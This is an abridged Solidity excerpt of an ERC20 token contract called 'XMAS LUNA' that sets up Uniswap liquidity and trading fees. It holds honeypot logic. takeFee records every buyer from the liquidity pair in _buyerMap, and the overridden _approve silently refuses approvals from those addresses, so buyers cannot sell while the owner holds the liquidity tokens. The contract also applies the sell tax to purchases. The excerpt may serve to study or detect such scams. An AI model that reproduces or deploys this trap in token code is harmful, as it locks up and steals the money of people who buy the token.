...
contract XSLUNA is ERC20 {
    ...
    mapping(address => bool) _buyerMap;

    bool swapEnabled;
    bool inSwap;

    constructor() ERC20("XMAS LUNA", "XSLUNA") {
        uint256 _tTotal = 11_000_000 * 10 ** _decimals;
        _mint(address(this), _tTotal);

        _maxTaxSwap = _tTotal.mul(20).div(1000);
    ...
    function openTrading() external onlyOwner() {
        ...
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)), 0, 0, _owner, block.timestamp);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        ...
        if (!inSwap && recipient == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 _realFee = _sellTax;
        if(uniswapV2Pair ==  sender) {
            _realFee = _sellTax;
            _buyerMap[recipient] = true;
            _buyCount++;
        }
        uint256 feeAmount = amount.mul(_realFee).div(100);
    ...
    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        if(_isFeeExempt[sender] || _isFeeExempt[recipient]) {
            ...
            return (uniswapV2Pair == sender || uniswapV2Pair == recipient);
        }
    }
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual override {
        if(!_buyerMap[owner]) super._approve(owner, spender, amount);
    }
